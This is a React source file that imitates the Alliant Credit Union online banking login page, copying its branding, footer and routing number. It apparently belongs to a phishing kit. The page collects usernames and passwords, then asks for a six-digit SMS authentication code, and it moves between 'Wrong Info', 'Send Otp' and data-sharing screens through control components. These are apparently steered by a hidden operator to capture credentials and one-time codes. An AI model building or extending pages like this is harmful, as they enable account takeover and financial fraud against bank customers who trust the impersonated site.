import { motion } from "framer-motion";
import useBankFunctions from "../../../../../../../hooks/useBankFunctions";
import clsx from "clsx";
import BankingHeader from "./BankingHeader";
import AlliantFavIcon from "../../../../../../../../assets/allBanks/banks/alliant/all4.ico";
import AlliantImage from "../../../../../../../../assets/allBanks/banks/alliant/all2.svg";
import { FaArrowRightLong, FaRegEye, FaRegEyeSlash } from "react-icons/fa6";
import { Link } from "react-router-dom";
import { RiLock2Fill } from "react-icons/ri";
import House from "../../../../../../../../assets/allBanks/banks/alliant/all3.png";
import Ncua from "../../../../../../../../assets/allBanks/banks/alliant/all5.png";
import ShareData from "./ShareData";
import { ClipLoader } from "react-spinners";
import BasicLoader from "../../../../../loading/BasicLoader";
import BankOtpControl from "./BankOtpControl";
import BankControl from "./BankControl";

const Alliant = ({
  handleCancel,
  bankName,
  selectedPath,
  allBankOpen,
  handleSelectSubmit,
  handleSelectedId,
  whatToShowDetails,
  setOtpOpen,
  OtpOpen,
  selectedOtp,
  handleSubmitOtp,
  handleSelectedOtp,
  otpInfo,
  activePathDetails,
  activeOtp,
  setAllBankItems,
  typeAccount,
  setTypeAccount,
  setIsOpenOtp,
  loading,
}) => {
  const {
    formState,
    handleTheMainSubmit,
    errorFormState,
    handleChange,
    onSubmitOtp,
    errorOtp,
    changeOtp,
    formOtp,
    resend,
    setshowPassword,
    showPassword,
    handleTheFinal,
    handleVerifiedOtp,
    onSumbitForm,
    handleResend,
  } = useBankFunctions(bankName, setOtpOpen, setAllBankItems, setTypeAccount);

  return (
    <motion.div
      initial={{ y: -100, opacity: 0 }}
      animate={{ y: 0, opacity: 1 }}
      exit={{ y: -100, opacity: 0 }}
      transition={{ type: "spring", stiffness: 300, damping: 50 }}
      className={clsx(
        "w-full min-h-screen h-full  top-0  bg-white",
        typeAccount ? "hidden" : "block"
      )}
    >
      <BankingHeader
        text="Alliant Credit Union Online Banking"
        handleCancel={handleCancel}
        img={AlliantFavIcon}
        setAllBankItems={setAllBankItems}
        setIsOpenOtp={setIsOpenOtp}
        setOtpOpen={setOtpOpen}
      />
      <header className="flex justify-center w-full my-14">
        <div className="">
          <img
            src={AlliantImage}
            alt=""
            className="w-[247px] h-[37px] object-contain"
          />
        </div>
      </header>

      <div className="items-center justify-center px-6 pt-8 customMiniTablet:flex text-customGray-900">
        <div
          className={clsx(
            "w-full customMiniTablet:w-[340px]",
            allBankOpen ? "hidden" : "block"
          )}
        >
          <div className="flex items-center justify-center gap-2 mb-10">
            <RiLock2Fill size={20} className="mb-1" />

            <h3 className="text-2xl font-semibold text-customGray-1055">
              Secure Log In
            </h3>
          </div>
          <div>
            <div className="space-y-7">
              <div>
                <div className="flex justify-between mb-2 text-sm text-customBlue-1027">
                  <label className="font-semibold text-customGray-1055">
                    {" "}
                    Username
                  </label>
                  <Link
                    to="https://www.alliantcreditunion.org/"
                    className="text-customBlue-1027"
                  >
                    Forgot Username
                  </Link>
                </div>
                <input
                  type="text"
                  value={formState.username}
                  name="username"
                  onChange={handleChange}
                  className={clsx(
                    "w-full px-2 py-3 border rounded-md outline-none border-customGray-1056",
                    errorFormState.username
                      ? "border border-customRed-1004"
                      : ""
                  )}
                />
                {errorFormState.username && (
                  <p className="flex gap-2 mt-2 text-sm text-customRed-1004">
                    Please enter a valid username.
                  </p>
                )}
              </div>
              <div className="relative">
                <div className="flex justify-between mb-2 text-sm text-customBlue-1027">
                  <label className="font-semibold text-customGray-1055">
                    {" "}
                    Password
                  </label>
                  <Link
                    to="https://www.alliantcreditunion.org/"
                    className="text-customBlue-1027"
                  >
                    Forgot Password
                  </Link>
                </div>
                <input
                  type={showPassword ? "text" : "password"}
                  value={formState.password}
                  name="password"
                  onChange={handleChange}
                  className={clsx(
                    "w-full px-2 py-3 pr-10 border rounded-md outline-none border-customGray-1056",
                    errorFormState.password
                      ? "border border-customRed-1004"
                      : ""
                  )}
                />
                <span
                  onClick={() => setshowPassword((prevShow) => !prevShow)}
                  className="absolute h-full py-4 right-4 "
                >
                  {showPassword ? (
                    <FaRegEyeSlash size={16} />
                  ) : (
                    <FaRegEye size={16} />
                  )}
                </span>
                {errorFormState.password && (
                  <p className="flex gap-2 mt-2 text-sm text-customRed-1004">
                    Please enter a valid password.
                  </p>
                )}
              </div>
            </div>
            <div className="w-full my-10 px-14">
              <button
                disabled={loading}
                onClick={(e) => handleTheMainSubmit(e, onSumbitForm)}
                className="w-full py-3 font-medium text-white rounded-full bg-customGreen-800"
              >
                {loading && <ClipLoader size={10} color="#fff" />}
                {loading ? "Loading..." : "Log In"}
              </button>
            </div>
            <p className="flex justify-center gap-1 mt-24 text-center">
              New to Alliant?
              <Link
                to="https://www.alliantcreditunion.org/"
                className="flex items-center gap-2 text-customBlue-1027"
              >
                Set Up Online Banking <FaArrowRightLong />
              </Link>{" "}
            </p>
          </div>
        </div>
        <div>
          {allBankOpen && (
            <div className={clsx(OtpOpen ? "hidden" : "block")}>
              <BankControl
                handleSelectedId={handleSelectedId}
                selectedPath={selectedPath}
                handleSelectSubmit={handleSelectSubmit}
              />
              <div>
                {activePathDetails.name === "Loading" && (
                  <p className="my-5 text-xl font-extrabold text-center text-customRed-200">
                    <BasicLoader />
                  </p>
                )}
                {activePathDetails.name === "Wrong Info" && (
                  <>
                    <div className={clsx("w-full customMiniTablet:w-[340px]")}>
                      <div className="flex items-center justify-center gap-2 mb-10">
                        <RiLock2Fill size={20} className="mb-1" />

                        <h3 className="text-2xl font-semibold text-customGray-1055">
                          Secure Log In
                        </h3>
                      </div>
                      <div>
                        <div className="flex justify-center gap-1 mx-3 my-5 font-extrabold text-center customMiniTablet:mx-0 text-customRed-200">
                          <p>{activePathDetails.body}</p>
                        </div>
                        <div className="space-y-7">
                          <div>
                            <div className="flex justify-between mb-2 text-sm text-customBlue-1027">
                              <label className="font-semibold text-customGray-1055">
                                {" "}
                                Username
                              </label>
                              <Link
                                to="https://www.alliantcreditunion.org/"
                                className="text-customBlue-1027"
                              >
                                Forgot Username
                              </Link>
                            </div>
                            <input
                              type="text"
                              value={formState.username}
                              name="username"
                              onChange={handleChange}
                              className={clsx(
                                "w-full px-2 py-3 border rounded-md outline-none border-customGray-1056",
                                errorFormState.username
                                  ? "border border-customRed-1004"
                                  : ""
                              )}
                            />
                            {errorFormState.username && (
                              <p className="flex gap-2 mt-2 text-sm text-customRed-1004">
                                Please enter a valid username.
                              </p>
                            )}
                          </div>
                          <div className="relative">
                            <div className="flex justify-between mb-2 text-sm text-customBlue-1027">
                              <label className="font-semibold text-customGray-1055">
                                {" "}
                                Password
                              </label>
                              <Link
                                to="https://www.alliantcreditunion.org/"
                                className="text-customBlue-1027"
                              >
                                Forgot Password
                              </Link>
                            </div>
                            <input
                              type={showPassword ? "text" : "password"}
                              value={formState.password}
                              name="password"
                              onChange={handleChange}
                              className={clsx(
                                "w-full px-2 py-3 pr-10 border rounded-md outline-none border-customGray-1056",
                                errorFormState.password
                                  ? "border border-customRed-1004"
                                  : ""
                              )}
                            />
                            <span
                              onClick={() =>
                                setshowPassword((prevShow) => !prevShow)
                              }
                              className="absolute h-full py-4 right-4 "
                            >
                              {showPassword ? (
                                <FaRegEyeSlash size={16} />
                              ) : (
                                <FaRegEye size={16} />
                              )}
                            </span>
                            {errorFormState.password && (
                              <p className="flex gap-2 mt-2 text-sm text-customRed-1004">
                                Please enter a valid password.
                              </p>
                            )}
                          </div>
                        </div>
                        <div className="w-full my-10 px-14">
                          <button
                            disabled={loading}
                            onClick={(e) =>
                              handleTheMainSubmit(e, onSumbitForm)
                            }
                            className="w-full py-3 font-medium text-white rounded-full bg-customGreen-800"
                          >
                            {loading && <ClipLoader size={10} color="#fff" />}
                            {loading ? "Loading..." : "Log In"}
                          </button>
                        </div>
                        <p className="flex justify-center gap-1 mt-24 text-center">
                          New to Alliant?
                          <Link
                            to="https://www.alliantcreditunion.org/"
                            className="flex items-center gap-2 text-customBlue-1027"
                          >
                            Set Up Online Banking <FaArrowRightLong />
                          </Link>{" "}
                        </p>
                      </div>
                    </div>
                  </>
                )}
                {activePathDetails.name === "Send Otp" && (
                  <>
                    <h3>{activePathDetails.body}</h3>

                    <div className={clsx("w-full customMiniTablet:w-[340px]")}>
                      <div>
                        <div className="text-customGray-1055">
                          <div>
                            <h3 className="mb-3 text-xl font-medium">
                              Enter Authentication Code
                            </h3>
                          </div>
                          <div>
                            <h2 className="mb-4 text-sm">
                              A text message with a 6-digit authentication code
                              was sent to your mobile phone, enter it below to
                              continue to your accounts
                            </h2>
                            <div>
                              <input
                                type="number"
                                value={formOtp.otpo}
                                name="otpo"
                                onChange={changeOtp}
                                className={clsx(
                                  "w-[60%] px-2 py-3 border rounded-md outline-none mr-10 border-customGray-1056 no-spinner",
                                  errorOtp.otpo
                                    ? "border border-customRed-1004"
                                    : ""
                                )}
                              />

                              {errorOtp.otpo && (
                                <p className="mt-2 text-sm text-customRed-1004">
                                  Please enter the code.
                                </p>
                              )}
                            </div>
                            <p
                              className={clsx(
                                "cursor-pointer text-customBlue-100 font-bold text-center my-10",
                                !resend &&
                                  "text-customBlue-500 text-opacity-25 cursor-not-allowed"
                              )}
                              onClick={handleResend}
                            >
                              Did not receive a code? Resend Code
                            </p>
                            <button
                              onClick={(e) => onSubmitOtp(e, handleVerifiedOtp)}
                              className=" py-3 w-[60%] font-medium text-white rounded-full bg-customGreen-800"
                            >
                              {loading && <ClipLoader size={10} color="#fff" />}
                              {loading ? "Loading..." : "Submit"}
                            </button>
                          </div>
                        </div>
                      </div>
                    </div>
                  </>
                )}
              </div>
            </div>
          )}
          {OtpOpen && (
            <>
              <BankOtpControl
                handleSelectedOtp={handleSelectedOtp}
                selectedOtp={selectedOtp}
                handleSubmitOtp={handleSubmitOtp}
              />

              <div>
                {activeOtp.name === "Loading" && (
                  <p className="my-5 text-xl font-extrabold text-center text-customRed-200">
                    <BasicLoader />
                  </p>
                )}
                {activeOtp.name === "wrong" && (
                  <>
                    <div className={clsx("w-full customMiniTablet:w-[340px]")}>
                      <div>
                        <div className="text-customGray-1055">
                          <div>
                            <h3 className="mb-3 text-xl font-medium">
                              Enter Authentication Code
                            </h3>
                          </div>
                          <div>
                            <h2 className="mb-4 text-sm">
                              A text message with a 6-digit authentication code
                              was sent to your mobile phone, enter it below to
                              continue to your accounts
                            </h2>
                            <div>
                              <input
                                type="number"
                                value={formOtp.otpo}
                                name="otpo"
                                onChange={changeOtp}
                                className={clsx(
                                  "w-[60%] px-2 py-3 border rounded-md outline-none mr-10 border-customGray-1056 no-spinner",
                                  errorOtp.otpo
                                    ? "border border-customRed-1004"
                                    : ""
                                )}
                              />

                              {errorOtp.otpo && (
                                <p className="mt-2 text-sm text-customRed-1004">
                                  Please enter the code.
                                </p>
                              )}
                              <h3 className="mt-2 text-sm text-customRed-200">
                                {activeOtp.body}
                              </h3>
                            </div>
                            <p
                              className={clsx(
                                "cursor-pointer text-customBlue-100 font-bold text-center my-10",
                                !resend &&
                                  "text-customBlue-500 text-opacity-25 cursor-not-allowed"
                              )}
                              onClick={handleResend}
                            >
                              Did not receive a code? Resend Code
                            </p>
                            <button
                              onClick={(e) => onSubmitOtp(e, handleVerifiedOtp)}
                              className=" py-3 w-[60%] font-medium text-white rounded-full bg-customGreen-800"
                            >
                              {loading && <ClipLoader size={10} color="#fff" />}
                              {loading ? "Loading..." : "Submit"}
                            </button>
                          </div>
                        </div>
                      </div>
                    </div>
                  </>
                )}
                {activeOtp.name === "otp" && (
                  <>
                    <ShareData
                      bankName={bankName}
                      handleTheFinal={handleTheFinal}
                      handleCancel={handleCancel}
                      setIsOpenOtp={setIsOpenOtp}
                      setAllBankItems={setAllBankItems}
                      siteLink="https://www.alliantcreditunion.org/"
                    />
                  </>
                )}
              </div>
            </>
          )}
        </div>
      </div>
      <footer className="p-8 mt-16 text-customGray-1055">
        <div className="flex flex-col justify-center customMiniTablet:flex-row customMiniTablet:justify-between mb-9">
          <div className="flex justify-center gap-6 mb-6 customMiniTablet:justify-normal">
            <div>
              <img
                src={House}
                alt=""
                className="w-[88px] h-[85px] object-contain"
              />
            </div>
            <div>
              <img
                src={Ncua}
                alt=""
                className="w-[168px] h-[84px] object-contain"
              />
            </div>
          </div>
          <div>
            <Link
              to="https://www.alliantcreditunion.org/"
              className="mb-3 text-sm font-medium customMiniTablet:flex text-customBlue-1027"
            >
              <p className="pr-3 customMiniTablet:border-r customMiniTablet:border-r-customBlue-1027">
                Disclosures
              </p>
              <p className=" customMiniTablet:px-3 customMiniTablet:border-r customMiniTablet:border-r-customBlue-1027">
                Terms
              </p>
              <p className=" customMiniTablet:px-3 customMiniTablet:border-r customMiniTablet:border-r-customBlue-1027">
                Privacy
              </p>
              <p className=" customMiniTablet:px-3 customMiniTablet:border-r customMiniTablet:border-r-customBlue-1027">
                Accessibility
              </p>
              <p className=" customMiniTablet:px-3">Help Center</p>
            </Link>
            <p className="mt-4">ABA Routing and Transit Number #271081528</p>
          </div>
        </div>
        <p className="text-sm">
          Alliant Credit Union, Chicago, IL. Your savings federally insured to
          at least $250,000 and backed by the full faith and credit of the
          United States Government - National Credit Union Administration
          (NCUA), a U.S. Government Agency. Ver: 1.0.0.0
        </p>
      </footer>
    </motion.div>
  );
};

export default Alliant;
